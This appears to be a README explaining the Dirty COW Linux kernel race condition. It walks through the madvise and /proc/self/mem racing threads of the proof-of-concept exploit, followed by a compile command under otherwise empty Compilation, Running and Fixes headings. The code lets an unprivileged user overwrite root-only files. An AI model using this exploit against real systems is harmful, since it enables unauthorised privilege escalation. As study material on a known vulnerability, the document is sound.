
# Dirty Cow exploit

## Exploit Overview
"A race condition was found in the way Linux kernel's memory subsystem
handled breakage of the read only private mappings COW situation on
write access.

An unprivileged local user could use this flaw to gain
write access to otherwise read only memory mappings and thus increase
their privileges on the system." - [From Redhat CVE](https://bugzilla.redhat.com/show_bug.cgi?id=1384344#)

The exploit leverages two functions madvise(MADV_DONTNEED) and open("/proc/self/mem",O_RDWR), to create a race condition between the two. Simply stated, we map the file to be changed to a copy that we can write to. We aren't able to write this copied file to the original file because we don't have the necessary permissions, however we are able to circumvent this via the race condition.

The first function, madvise, looks like this:

```
void *madviseThread(void *arg){
    char *str;
    str=(char*)arg;
    int i,c=0;
    for(i=0;i<100000000;i++)
    {
        c+=madvise(map,100,MADV_DONTNEED);
    }
    printf("madvise %d\n\n",c);
  }
```
The madvice call is used mainly for optimization by allowing the user to give advice/directions to the kernel about how the given address range will be used. In this case we tell it that we don't need the first 100 bytes by passing 100, MADV_DONTNEED. The man page specifies that this means "do not expect access in the near future" and that the memory access will differ now in that any "subsequent accesses of pages in the range will succeed, but will result in either repopulating the memory contents from the up-to-date contents of the underlying mapped file". This is very important to the exploit as it tells us that everytime we try to access this file we will repopulate the contents, which is part of the race condition.

The second function, proc/self/mem uses 'proc' which acts a pseudo-file system that helps runs most file operations in linux (everything is a file is very powerful here). /proc/self/mem is a "file" that contains the current process' memory, which we use to write to our file.

```
void *procselfmemThread(void *arg){
    char *str;
    str=(char*)arg;
    int f=open("/proc/self/mem",O_RDWR);
    int i,c=0;
    for(i=0;i<100000000;i++) {
        lseek(f,(uintptr_t) map,SEEK_SET);
        c+=write(f,str,strlen(str));
    }
    printf("procselfmem %d\n\n", c);
}
```
The above code attempts to write the passed argument string in the memory of the process in the location of the mapped file. This tries to write to the copy of the file, creating a copy-on-write event. 

This should not work and the two methods working independent of each other would not cause such an exploit to occur, but when raced against each other, an edge case occurs in which the actual file is written to instead of the mapped file. This allows us, for this simple case, to write to a file with root only write permission

## Compilation

## Running

## Fixes
```
gcc -pthread -o dirty_cow dirty_cow.c
```

